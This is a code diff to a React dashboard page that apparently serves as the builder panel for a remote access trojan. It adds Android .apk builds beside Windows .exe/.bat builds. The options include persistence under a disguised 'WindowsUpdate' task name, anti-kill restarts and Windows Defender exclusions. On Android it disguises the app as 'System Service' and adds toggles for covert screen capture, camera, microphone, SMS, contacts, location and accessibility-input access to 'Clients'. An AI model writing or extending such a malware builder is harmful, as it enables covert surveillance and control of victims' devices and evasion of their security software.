@@ -6,7 +6,7 @@ import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/lib/auth-context";
 import { createBuild } from "@/lib/builds.functions";
-import { Download, Plus, X, Loader2, CheckCircle2, AlertCircle, ImageIcon, Trash2, Wrench } from "lucide-react";
+import { Download, Plus, X, Loader2, CheckCircle2, AlertCircle, ImageIcon, Trash2, Wrench, Monitor, Smartphone } from "lucide-react";
 
 export const Route = createFileRoute("/dashboard/builder")({ component: BuilderPage });
 
@@ -17,6 +17,7 @@ type Build = {
   download_url: string | null;
   error: string | null;
   output_kind: string;
+  platform: string;
   created_at: string;
 };
 
@@ -31,11 +32,11 @@ function BuilderPage() {
     if (!user) return;
     const { data } = await supabase
       .from("builds")
-      .select("id,name,status,download_url,error,output_kind,created_at")
+      .select("id,name,status,download_url,error,output_kind,platform,created_at")
       .eq("user_id", user.id)
       .order("created_at", { ascending: false })
       .limit(20);
-    setBuilds((data ?? []) as Build[]);
+    setBuilds((data ?? []) as unknown as Build[]);
   };
 
   useEffect(() => { load(); }, [user]);
@@ -51,7 +52,6 @@ function BuilderPage() {
     return () => { supabase.removeChannel(ch); };
   }, [user]);
 
-  // Buildserver status: green if a worker has polled within the last 20s.
   useEffect(() => {
     let cancelled = false;
     const ping = async () => {
@@ -120,6 +120,7 @@ function BuilderPage() {
             <StatusIcon s={b.status} />
             <div className="flex-1 min-w-0">
               <div className="flex items-center gap-2">
+                {b.platform === "android" ? <Smartphone className="h-3.5 w-3.5 text-muted-foreground" /> : <Monitor className="h-3.5 w-3.5 text-muted-foreground" />}
                 <span className="truncate font-medium">{b.name}</span>
                 <span className="rounded bg-muted px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-muted-foreground">.{b.output_kind}</span>
               </div>
@@ -152,6 +153,7 @@ function StatusIcon({ s }: { s: Build["status"] }) {
 }
 
 function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCreate: (args: { data: any }) => Promise<any>; userId: string }) {
+  const [platform, setPlatform] = useState<"windows" | "android">("windows");
   const [name, setName] = useState("");
   const [startup, setStartup] = useState(false);
   const [startupName, setStartupName] = useState("");
@@ -159,11 +161,27 @@ function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCre
   const [antikill, setAntikill] = useState(false);
   const [wdExclusion, setWdExclusion] = useState(false);
   const [requireAdmin, setRequireAdmin] = useState(false);
-  const [funFeatures] = useState(true); // single full stub — always on
+  const [funFeatures] = useState(true);
   const [tag, setTag] = useState("");
-  const [outputKind, setOutputKind] = useState<"exe" | "bat">("exe");
+  const [outputKind, setOutputKind] = useState<"exe" | "bat" | "apk">("exe");
   const [iconFile, setIconFile] = useState<File | null>(null);
   const [busy, setBusy] = useState(false);
+  // Android feature toggles
+  const [featScreen, setFeatScreen] = useState(true);
+  const [featCamera, setFeatCamera] = useState(true);
+  const [featFiles, setFeatFiles] = useState(true);
+  const [featMic, setFeatMic] = useState(true);
+  const [featLocation, setFeatLocation] = useState(false);
+  const [featSms, setFeatSms] = useState(false);
+  const [featContacts, setFeatContacts] = useState(false);
+  const [featNotifications, setFeatNotifications] = useState(true);
+  const [featInput, setFeatInput] = useState(false);
+  const [appDisplayName, setAppDisplayName] = useState("System Service");
+
+  useEffect(() => {
+    if (platform === "android") setOutputKind("apk");
+    else setOutputKind("exe");
+  }, [platform]);
 
   const submit = async () => {
     if (!/^[a-zA-Z0-9 _.-]+$/.test(name) || name.length < 1) {
@@ -171,7 +189,7 @@ function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCre
       return;
     }
     if (tag && !/^[a-zA-Z0-9 _-]+$/.test(tag)) {
-      toast.error("Invalid tag (letters, numbers, space, _ or - only)");
+      toast.error("Invalid tag");
       return;
     }
     setBusy(true);
@@ -183,13 +201,29 @@ function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCre
       iconUrl = supabase.storage.from("builds").getPublicUrl(path).data.publicUrl;
     }
     try {
-      const res = await onCreate({ data: {
-        name, startup, startup_name: startupName || null, debug, antikill,
-        wd_exclusion: wdExclusion, require_admin: requireAdmin,
-        fun_features: funFeatures,
-        tag: tag || null,
-        output_kind: outputKind, icon_url: iconUrl,
-      }});
+      const data: any = {
+        name, startup, startup_name: startupName || null, debug,
+        tag: tag || null, output_kind: outputKind, icon_url: iconUrl,
+        platform,
+      };
+      if (platform === "windows") {
+        data.antikill = antikill;
+        data.wd_exclusion = wdExclusion;
+        data.require_admin = requireAdmin;
+        data.fun_features = funFeatures;
+      } else {
+        data.antikill = false;
+        data.wd_exclusion = false;
+        data.require_admin = false;
+        data.fun_features = false;
+        data.android_features = {
+          screen: featScreen, camera: featCamera, files: featFiles,
+          mic: featMic, location: featLocation, sms: featSms,
+          contacts: featContacts, notifications: featNotifications, input: featInput,
+        };
+        data.app_display_name = appDisplayName;
+      }
+      const res = await onCreate({ data });
       if (res?.ok === false) toast.error(res.error);
       else { toast.success("Build queued"); onClose(); }
     } catch (e: any) {
@@ -212,35 +246,74 @@ function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCre
           </button>
         </div>
         <div className="mt-4 flex-1 space-y-3 overflow-y-auto pr-1">
-          <Field label="Build name">
-            <input value={name} onChange={(e) => setName(e.target.value)} placeholder="my-agent" className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
-          </Field>
-          <Field label="Output format">
+          {/* Platform selector */}
+          <Field label="Platform">
             <div className="flex gap-2">
-              {(["exe","bat"] as const).map((k) => (
-                <button key={k} onClick={() => setOutputKind(k)} className={`flex-1 rounded-md border px-3 py-2 text-sm font-medium transition ${outputKind===k?"border-primary bg-primary/15 text-primary":"border-border bg-secondary text-muted-foreground"}`}>.{k}</button>
+              {(["windows", "android"] as const).map((p) => (
+                <button key={p} onClick={() => setPlatform(p)} className={`flex flex-1 items-center justify-center gap-2 rounded-md border px-3 py-2 text-sm font-medium transition ${platform === p ? "border-primary bg-primary/15 text-primary" : "border-border bg-secondary text-muted-foreground"}`}>
+                  {p === "windows" ? <Monitor className="h-4 w-4" /> : <Smartphone className="h-4 w-4" />}
+                  {p === "windows" ? "Windows (.exe)" : "Android (.apk)"}
+                </button>
               ))}
             </div>
           </Field>
-          <Toggle label="Run on startup" v={startup} onChange={setStartup} />
-          {startup && (
-            <Field label="Startup task name">
-              <input value={startupName} onChange={(e) => setStartupName(e.target.value)} placeholder={name || "WindowsUpdate"} className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
-            </Field>
+
+          <Field label="Build name">
+            <input value={name} onChange={(e) => setName(e.target.value)} placeholder="my-agent" className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
+          </Field>
+
+          {platform === "windows" && (
+            <>
+              <Field label="Output format">
+                <div className="flex gap-2">
+                  {(["exe","bat"] as const).map((k) => (
+                    <button key={k} onClick={() => setOutputKind(k)} className={`flex-1 rounded-md border px-3 py-2 text-sm font-medium transition ${outputKind===k?"border-primary bg-primary/15 text-primary":"border-border bg-secondary text-muted-foreground"}`}>.{k}</button>
+                  ))}
+                </div>
+              </Field>
+              <Toggle label="Run on startup" v={startup} onChange={setStartup} />
+              {startup && (
+                <Field label="Startup task name">
+                  <input value={startupName} onChange={(e) => setStartupName(e.target.value)} placeholder={name || "WindowsUpdate"} className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
+                </Field>
+              )}
+              <Toggle label="Debug console (show window)" v={debug} onChange={setDebug} />
+              <Toggle label="Anti-kill / auto-restart" v={antikill} onChange={setAntikill} />
+              <Toggle label="Windows Defender exclusion" v={wdExclusion} onChange={setWdExclusion} />
+              <Toggle label="Require admin (UAC prompt)" v={requireAdmin} onChange={setRequireAdmin} />
+            </>
           )}
-          <Toggle label="Debug console (show window)" v={debug} onChange={setDebug} />
-          <Toggle label="Anti-kill / anti-crash (auto-restart if killed)" v={antikill} onChange={setAntikill} />
-          <Toggle label="Add Windows Defender exclusion (install folder + exe)" v={wdExclusion} onChange={setWdExclusion} />
-          <Toggle label="Require admin (prompt UAC on launch)" v={requireAdmin} onChange={setRequireAdmin} />
-          
-          <Field label="Tag (shown on Clients tab, e.g. home)">
+
+          {platform === "android" && (
+            <>
+              <Field label="App display name">
+                <input value={appDisplayName} onChange={(e) => setAppDisplayName(e.target.value)} placeholder="System Service" className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
+              </Field>
+              <Toggle label="Start on boot" v={startup} onChange={setStartup} />
+              <Toggle label="Debug (Logcat)" v={debug} onChange={setDebug} />
+              <div className="rounded-md border border-border/60 p-3 space-y-2">
+                <div className="text-xs font-medium text-muted-foreground">Features</div>
+                <Toggle label="Screen capture" v={featScreen} onChange={setFeatScreen} />
+                <Toggle label="Camera" v={featCamera} onChange={setFeatCamera} />
+                <Toggle label="File manager" v={featFiles} onChange={setFeatFiles} />
+                <Toggle label="Microphone" v={featMic} onChange={setFeatMic} />
+                <Toggle label="Location (GPS)" v={featLocation} onChange={setFeatLocation} />
+                <Toggle label="SMS reader" v={featSms} onChange={setFeatSms} />
+                <Toggle label="Contacts" v={featContacts} onChange={setFeatContacts} />
+                <Toggle label="Notifications" v={featNotifications} onChange={setFeatNotifications} />
+                <Toggle label="Input (accessibility)" v={featInput} onChange={setFeatInput} />
+              </div>
+            </>
+          )}
+
+          <Field label="Tag (shown on Clients tab)">
             <input value={tag} onChange={(e) => setTag(e.target.value)} placeholder="home" maxLength={32} className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
           </Field>
           <Field label="Custom icon (optional)">
             <label className="flex items-center gap-2 rounded-md border border-dashed border-border bg-secondary/40 px-3 py-2 text-sm cursor-pointer hover:bg-accent">
               <ImageIcon className="h-4 w-4" />
-              <span className="truncate">{iconFile?.name ?? "Choose .ico or .png"}</span>
-              <input type="file" accept=".ico,.png,image/*" className="hidden" onChange={(e) => setIconFile(e.target.files?.[0] ?? null)} />
+              <span className="truncate">{iconFile?.name ?? (platform === "android" ? "Choose .png" : "Choose .ico or .png")}</span>
+              <input type="file" accept={platform === "android" ? ".png,image/png" : ".ico,.png,image/*"} className="hidden" onChange={(e) => setIconFile(e.target.files?.[0] ?? null)} />
             </label>
           </Field>
         </div>
